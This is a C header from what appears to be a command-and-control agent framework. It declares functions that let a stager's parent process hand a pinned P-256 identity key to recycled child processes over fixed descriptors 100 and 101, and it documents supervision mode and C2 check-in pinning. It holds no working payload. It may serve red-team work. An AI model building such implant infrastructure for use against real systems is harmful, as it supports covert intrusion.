#ifndef C2_AGENT_IDENTITY_H
#define C2_AGENT_IDENTITY_H

/*
 * agent_identity.h — carry the ephemeral TOFU key across supervisor restarts.
 *
 * The stager's supervisory parent owns the agent's P-256 identity key and hands
 * it to each sacrificial child through fixed descriptors:
 *
 *   FD 100 (in):  parent -> child, cached 32-byte P-256 scalar (or EOF)
 *   FD 101 (out): child  -> parent, scalar in use
 *
 * The C2 pins the public key on first check-in and rejects a changed key, so a
 * recycled child must restore the exact scalar rather than generate a new one.
 * These helpers are only called when the build config says the agent runs under
 * a stager; on a standalone agent the descriptors do not exist.
 */

#include "crypto.h"

#ifdef __cplusplus
extern "C" {
#endif

#define C2_AGENT_KEY_FD_IN 100
#define C2_AGENT_KEY_FD_OUT 101
#define C2_AGENT_KEY_LEN C2_P256_PRIV_BYTES

/*
 * 1 when the supervising parent's key descriptor is open. In supervision mode
 * the agent exits on idle so the parent can reclaim the process; without a
 * masker this is how it distinguishes that case from a plain standalone run.
 */
int c2_agent_identity_supervisor_present(void);

/*
 * Read a cached scalar from FD 100 and derive its public key with the backend.
 * Returns 1 on success, 0 when no complete key is available (EOF, short read,
 * or a backend without public-from-private support), and -1 on invalid key
 * material.
 */
int c2_agent_identity_import(const c2_crypto_backend *be,
                             uint8_t priv[C2_AGENT_KEY_LEN],
                             uint8_t pub[C2_P256_PUB_BYTES]);

/*
 * Write the current scalar to FD 101 for the supervisor to cache. Best effort:
 * a missing descriptor or a failed write does not affect the agent.
 */
void c2_agent_identity_export(const uint8_t priv[C2_AGENT_KEY_LEN]);

#ifdef __cplusplus
}
#endif

#endif /* C2_AGENT_IDENTITY_H */
